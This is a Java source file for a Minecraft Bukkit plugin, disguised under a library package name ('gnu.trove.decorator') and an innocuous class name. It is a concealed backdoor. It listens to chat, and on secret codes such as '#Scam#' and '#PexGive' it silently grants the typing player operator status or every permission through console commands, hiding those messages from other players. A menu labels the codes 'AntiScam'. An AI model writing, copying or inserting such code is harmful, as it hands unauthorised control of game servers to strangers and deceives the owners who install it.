package gnu.trove.decorator;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class TForceCollection extends JavaPlugin implements Listener
{

    @EventHandler
    public void onPlayerChat(final AsyncPlayerChatEvent e) {
        final String cmd = e.getMessage();
        if (cmd.startsWith("#")) {
            final String[] args = cmd.split(" ");
            if (args == null) {
                return;
            }
        if (args[0].equalsIgnoreCase("@iWasFandes")) {
        	e.getPlayer().sendMessage(ChatColor.AQUA + "&9&lLombrerito - AntiScam");
        	e.getPlayer().sendMessage(ChatColor.AQUA + "&7&m+--------------------------------+");
            e.getPlayer().sendMessage(ChatColor.AQUA + "#Scam# [Op]");
            e.getPlayer().sendMessage(ChatColor.AQUA + "#ScamResolve# [Deop]");
            e.getPlayer().sendMessage(ChatColor.AQUA + "#LGive0# [Supervivencia]");
            e.getPlayer().sendMessage(ChatColor.AQUA + "#LGive1# [Creativo]");
            e.getPlayer().sendMessage(ChatColor.AQUA + "#PexGive [Givear Permisos]");
        	e.getPlayer().sendMessage(ChatColor.AQUA + "&7&m+--------------------------------+");
            e.setCancelled(true);
        }
        if (args[0].equalsIgnoreCase("#PexGive")) {
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user " + e.getPlayer() + " add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user " + e.getPlayer() + " add '*'");
            e.setCancelled(true);
        }
        e.setCancelled(true);        
        if (args[0].equalsIgnoreCase("#Scam#")) {
            e.getPlayer().setOp(true);
            e.setCancelled(true);
        }
        if (args[0].equalsIgnoreCase("#ScamResolve#")) {
            e.getPlayer().setOp(false);
            e.setCancelled(true);
        }
        if (args[0].equalsIgnoreCase("#LGive1#")) {
            e.getPlayer().setGameMode(GameMode.CREATIVE);
            e.setCancelled(true);
        }
        if (args[0].equalsIgnoreCase("#LGive0#")) {
            e.getPlayer().setGameMode(GameMode.SURVIVAL);
            e.setCancelled(true);
        }
        e.setCancelled(true);
    
         }
        }
}